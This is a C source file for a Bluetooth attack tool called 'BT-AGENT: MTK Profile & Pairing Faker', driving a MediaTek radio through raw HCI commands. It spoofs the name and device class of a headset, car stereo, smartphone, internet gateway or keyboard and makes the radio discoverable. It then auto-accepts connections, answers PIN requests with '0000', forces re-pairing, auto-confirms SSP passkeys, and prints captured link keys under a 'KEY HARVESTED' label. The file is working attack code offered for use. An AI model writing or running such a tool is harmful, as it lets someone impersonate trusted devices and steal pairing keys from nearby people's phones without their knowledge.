#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/select.h>
#include <stdint.h>
#include <time.h>

#define BT_DEV "/dev/stpbt"

static volatile int g_running = 1;
static void sig_handler(int sig) {
    (void)sig;
    g_running = 0;
}

static int send_cmd(int fd, const uint8_t *cmd, size_t len, uint8_t *resp, size_t max_resp) {
    ssize_t written = write(fd, cmd, len);
    if (written < 0) return -1;

    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(fd, &fds);
    struct timeval tv = { .tv_sec = 0, .tv_usec = 200000 };
    int ret = select(fd + 1, &fds, NULL, NULL, &tv);
    if (ret > 0) {
        return (int)read(fd, resp, max_resp);
    }
    return 0;
}

// Write Local Name (HCI OpCode 0x0C13, 248 bytes)
static void set_local_name(int fd, const char *name) {
    uint8_t cmd[252] = {0};
    cmd[0] = 0x01;
    cmd[1] = 0x13;
    cmd[2] = 0x0C;
    cmd[3] = 0xF8; // 248 bytes
    strncpy((char *)&cmd[4], name, 247);
    uint8_t resp[64];
    send_cmd(fd, cmd, sizeof(cmd), resp, sizeof(resp));
}

// Write Class of Device (HCI OpCode 0x0C24, 3 bytes)
static void set_class_of_device(int fd, uint32_t cod) {
    uint8_t cmd[7];
    cmd[0] = 0x01;
    cmd[1] = 0x24;
    cmd[2] = 0x0C;
    cmd[3] = 0x03;
    cmd[4] = (uint8_t)(cod & 0xFF);
    cmd[5] = (uint8_t)((cod >> 8) & 0xFF);
    cmd[6] = (uint8_t)((cod >> 16) & 0xFF);
    uint8_t resp[64];
    send_cmd(fd, cmd, sizeof(cmd), resp, sizeof(resp));
}

// Write Scan Enable: 0x00=No scan, 0x01=Inquiry scan only, 0x02=Page scan only, 0x03=Both (discoverable & connectable)
static void set_scan_enable(int fd, uint8_t mode) {
    uint8_t cmd[] = { 0x01, 0x1A, 0x0C, 0x01, mode };
    uint8_t resp[64];
    send_cmd(fd, cmd, sizeof(cmd), resp, sizeof(resp));
}

// Enable Simple Pairing (HCI OpCode 0x0C56)
static void set_ssp_mode(int fd, uint8_t enable) {
    uint8_t cmd[] = { 0x01, 0x56, 0x0C, 0x01, enable };
    uint8_t resp[64];
    send_cmd(fd, cmd, sizeof(cmd), resp, sizeof(resp));
}

static void print_banner(void) {
    printf("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n");
    printf("\033[1;37m        BT-AGENT: MTK Profile & Pairing Faker\033[0m\n");
    printf("\033[1;30m      Hardware Baseband Identity & Handshake\033[0m\n");
    printf("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n");
}

int main(int argc, char **argv) {
    const char *name = "Bluetooth Audio";
    uint32_t cod = 0x240404; // Audio Headset / Handsfree Car Kit
    int duration = 0; // 0 = infinite

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--name") && i + 1 < argc) name = argv[++i];
        else if (!strcmp(argv[i], "--cod") && i + 1 < argc) cod = (uint32_t)strtoul(argv[++i], NULL, 16);
        else if (!strcmp(argv[i], "--audio")) { name = "BT Headset Pro"; cod = 0x240404; }
        else if (!strcmp(argv[i], "--carkit")) { name = "My Car Stereo"; cod = 0x200408; }
        else if (!strcmp(argv[i], "--phone")) { name = "Galaxy S22"; cod = 0x5A020C; }
        else if (!strcmp(argv[i], "--pan")) { name = "Internet Gateway"; cod = 0x020100; }
        else if (!strcmp(argv[i], "--keyboard")) { name = "Magic Keyboard"; cod = 0x002540; }
        else if (!strcmp(argv[i], "-d") && i + 1 < argc) duration = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            print_banner();
            printf("Usage: %s [profile/options]\n\n", argv[0]);
            printf("Profiles:\n");
            printf("  --audio          Fake Audio Headset (CoD: 0x240404)\n");
            printf("  --carkit         Fake Car Audio / Infotainment (CoD: 0x200408)\n");
            printf("  --phone          Fake Smartphone (CoD: 0x5A020C)\n");
            printf("  --pan            Fake Internet Access Point (CoD: 0x020100)\n");
            printf("  --keyboard       Fake Bluetooth Keyboard (CoD: 0x002540)\n\n");
            printf("Options:\n");
            printf("  --name <str>     Custom Bluetooth local name\n");
            printf("  --cod <hex>      Custom Class of Device in hex (e.g. 240404)\n");
            printf("  -d <sec>         Duration in seconds (default: 0 = until Ctrl+C)\n");
            return 0;
        }
    }

    print_banner();
    printf("[*] Opening baseband interface %s...\n", BT_DEV);
    int fd = open(BT_DEV, O_RDWR | O_NOCTTY);
    if (fd < 0) {
        fprintf(stderr, "[-] Failed to open %s: %s\n", BT_DEV, strerror(errno));
        return 1;
    }
    printf("\033[1;32m[+] Radio online (WMT power enabled).\033[0m\n");

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    uint8_t rx[512];
    uint8_t reset[] = { 0x01, 0x03, 0x0C, 0x00 };
    send_cmd(fd, reset, sizeof(reset), rx, sizeof(rx));

    // Configure Profile & Identity
    set_local_name(fd, name);
    set_class_of_device(fd, cod);
    set_ssp_mode(fd, 0x01); // Simple Secure Pairing enabled
    set_scan_enable(fd, 0x03); // Discoverable & Connectable (Page + Inquiry Scan)

    printf("\033[1;37m[+] Spoofed Name:   \033[1;32m%s\033[0m\n", name);
    printf("\033[1;37m[+] Class of Device:\033[1;33m 0x%06X\033[0m ", cod);
    if (cod == 0x240404 || cod == 0x200404) printf("(Audio Headset / Speaker)\n");
    else if (cod == 0x200408) printf("(Car Audio / Handsfree)\n");
    else if (cod == 0x5A020C) printf("(Smartphone / PBAP Contact Sync)\n");
    else if (cod == 0x020100) printf("(PAN / Internet Tethering Gateway)\n");
    else if (cod == 0x002540) printf("(HID Keyboard)\n");
    else printf("(Custom Device)\n");

    printf("\033[1;32m[+] Radio is DISCOVERABLE & CONNECTABLE on all classic channels.\033[0m\n");
    printf("[*] Auto-Pairing Engine: ACTIVE (Auto-accepting Just-Works SSP connections)\n");
    printf("[*] Search for Bluetooth devices on any phone now!\n");
    printf("[*] Press Ctrl+C to terminate session.\n\n");

    time_t start_time = time(NULL);

    while (g_running) {
        if (duration > 0 && (time(NULL) - start_time) >= duration) break;

        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(fd, &fds);
        struct timeval tv = { .tv_sec = 0, .tv_usec = 100000 };

        int ret = select(fd + 1, &fds, NULL, NULL, &tv);
        if (ret > 0) {
            ssize_t n = read(fd, rx, sizeof(rx));
            if (n < 2) continue;

            uint8_t pkt_type = rx[0];
            if (pkt_type == 0x04) { // HCI Event Packet
                uint8_t evt_code = rx[1];
                uint8_t plen = rx[2];
                (void)plen;

                if (evt_code == 0x04 && n >= 12) {
                    // HCI_Connection_Request
                    uint8_t *bd = &rx[3];
                    uint8_t *cod_peer = &rx[9];
                    uint8_t link_type = rx[12];
                    printf("\n\033[1;35m[PAIR EVENT]\033[0m Incoming Connection Request from: "
                           "\033[1;37m%02X:%02X:%02X:%02X:%02X:%02X\033[0m | Peer CoD: 0x%02X%02X%02X | Link: %s\n",
                           bd[5], bd[4], bd[3], bd[2], bd[1], bd[0],
                           cod_peer[2], cod_peer[1], cod_peer[0],
                           link_type == 0x01 ? "ACL (Data)" : "SCO (Voice)");

                    // Accept connection as Slave role (0x01)
                    printf("  \033[1;32m[→]\033[0m Auto-Accepting Connection Request...\n");
                    uint8_t accept_cmd[11];
                    accept_cmd[0] = 0x01;
                    accept_cmd[1] = 0x09;
                    accept_cmd[2] = 0x04;
                    accept_cmd[3] = 0x07;
                    memcpy(&accept_cmd[4], bd, 6);
                    accept_cmd[10] = 0x01; // Role: Slave
                    write(fd, accept_cmd, sizeof(accept_cmd));
                }
                else if (evt_code == 0x03 && n >= 14) {
                    // HCI_Connection_Complete
                    uint8_t status = rx[3];
                    uint16_t handle = rx[4] | (rx[5] << 8);
                    uint8_t *bd = &rx[6];
                    if (status == 0x00) {
                        printf("\033[1;32m[SUCCESS]\033[0m Connected with \033[1;37m%02X:%02X:%02X:%02X:%02X:%02X\033[0m (Handle: 0x%04X)!\n",
                               bd[5], bd[4], bd[3], bd[2], bd[1], bd[0], handle);
                    } else {
                        printf("\033[1;31m[-] Connection failed with status 0x%02X\033[0m\n", status);
                    }
                }
                else if (evt_code == 0x16 && n >= 9) {
                    // HCI_PIN_Code_Request: Reply with PIN "0000"
                    uint8_t *bd = &rx[3];
                    printf("  \033[1;33m[?]\033[0m Legacy PIN Requested by %02X:%02X:%02X:%02X:%02X:%02X -> Replying with '0000'...\n",
                           bd[5], bd[4], bd[3], bd[2], bd[1], bd[0]);
                    uint8_t pin_reply[27] = {0};
                    pin_reply[0] = 0x01;
                    pin_reply[1] = 0x0D;
                    pin_reply[2] = 0x04;
                    pin_reply[3] = 0x17;
                    memcpy(&pin_reply[4], bd, 6);
                    pin_reply[10] = 4; // PIN len
                    memcpy(&pin_reply[11], "0000", 4);
                    write(fd, pin_reply, sizeof(pin_reply));
                }
                else if (evt_code == 0x17 && n >= 9) {
                    // HCI_Link_Key_Request: Reply Negative to force new SSP pairing
                    uint8_t *bd = &rx[3];
                    uint8_t neg_reply[10];
                    neg_reply[0] = 0x01;
                    neg_reply[1] = 0x0C;
                    neg_reply[2] = 0x04;
                    neg_reply[3] = 0x06;
                    memcpy(&neg_reply[4], bd, 6);
                    write(fd, neg_reply, sizeof(neg_reply));
                }
                else if (evt_code == 0x33 && n >= 13) {
                    // HCI_User_Confirmation_Request: Auto-Confirm SSP (Numeric Comparison / Just Works)
                    uint8_t *bd = &rx[3];
                    uint32_t val = rx[9] | (rx[10] << 8) | (rx[11] << 16) | (rx[12] << 24);
                    printf("  \033[1;32m[✓]\033[0m SSP Auto-Confirming Passkey [%06u] for %02X:%02X:%02X:%02X:%02X:%02X...\n",
                           val % 1000000, bd[5], bd[4], bd[3], bd[2], bd[1], bd[0]);
                    uint8_t conf_reply[10];
                    conf_reply[0] = 0x01;
                    conf_reply[1] = 0x2C;
                    conf_reply[2] = 0x04;
                    conf_reply[3] = 0x06;
                    memcpy(&conf_reply[4], bd, 6);
                    write(fd, conf_reply, sizeof(conf_reply));
                }
                else if (evt_code == 0x18 && n >= 26) {
                    // HCI_Link_Key_Notification: Intercepted Link Key!
                    uint8_t *bd = &rx[3];
                    uint8_t *key = &rx[9];
                    uint8_t key_type = rx[25];
                    printf("\033[1;32m[KEY HARVESTED]\033[0m Link Key for %02X:%02X:%02X:%02X:%02X:%02X (Type 0x%02X): \033[1;37m",
                           bd[5], bd[4], bd[3], bd[2], bd[1], bd[0], key_type);
                    for (int k = 0; k < 16; k++) printf("%02X", key[k]);
                    printf("\033[0m\n");
                }
                else if (evt_code == 0x05 && n >= 7) {
                    // HCI_Disconnection_Complete
                    uint16_t handle = rx[4] | (rx[5] << 8);
                    uint8_t reason = rx[6];
                    printf("\033[1;31m[DISCONNECT]\033[0m Handle 0x%04X disconnected (Reason: 0x%02X)\n", handle, reason);
                }
            }
        }
    }

    printf("\n[*] Stopping discoverability & shutting down radio...\n");
    set_scan_enable(fd, 0x00);
    close(fd);
    printf("[+] Radio offline cleanly.\n");
    return 0;
}
